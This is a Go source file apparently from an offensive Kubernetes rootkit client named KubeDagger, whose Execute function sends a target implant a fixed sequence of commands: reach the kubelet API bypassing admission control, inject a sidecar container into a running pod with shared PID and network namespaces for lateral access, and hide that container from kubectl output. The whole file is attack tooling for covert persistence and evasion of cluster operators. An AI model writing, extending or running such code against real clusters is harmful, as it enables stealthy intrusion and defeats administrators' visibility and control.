package sidecar_inject

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type InjectResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool               `json:"success"`
}

func Execute(target, podName, image, namespace, output string) error {
	result := &InjectResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"connect_kubelet_api",
			"connect to local kubelet container creation API (bypasses admission control)",
			"sidecar_connect_kubelet",
		},
		{
			"create_container_spec",
			"build sidecar container spec with shared PID/network namespace",
			"sidecar_create_spec",
		},
		{
			"inject_sidecar",
			"inject sidecar container into running pod via CRI runtime API",
			"sidecar_inject",
		},
		{
			"configure_shared_ns",
			"configure shared PID and network namespace for lateral access",
			"sidecar_share_ns",
		},
		{
			"hide_container",
			"mask injected container from kubectl get pods output via API interception",
			"sidecar_hide",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + podName + "#" + image + "#" + namespace
		status := shared.SendCommand(target, "/sidecar_inject", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
